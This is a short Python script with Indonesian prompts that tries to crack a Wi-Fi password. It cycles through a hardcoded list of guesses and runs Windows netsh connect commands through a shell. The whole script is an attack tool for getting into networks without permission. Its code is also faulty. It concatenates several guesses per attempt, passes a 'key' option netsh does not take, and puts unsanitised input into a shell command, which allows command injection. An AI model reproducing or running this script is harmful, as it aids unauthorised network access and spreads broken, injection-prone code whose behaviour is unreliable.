import subprocess
from random import *

wifi_name = input("Masukkan Nama Wi-Fi: ")
pwd = ['password1', 'password2', 'password3', 'password4']  # Ganti dengan kata sandi yang ingin Anda coba

u_pwd = ""
while u_pwd not in pwd:
    u_pwd = ""
    for _ in range(len(pwd)):
        guess_pwd = pwd[randint(0, len(pwd)-1)]
        u_pwd += guess_pwd

    command = f'netsh wlan connect name="{wifi_name}" ssid="{wifi_name}" key="{u_pwd}"'
    result = subprocess.run(command, capture_output=True, text=True, shell=True)
    if "successfully" in result.stdout:
        print(f"Kata Sandi Wi-Fi yang ditemukan: {u_pwd}")
        break
    else:
        print(f"Kata Sandi {u_pwd} gagal. Mencoba kata sandi berikutnya...")
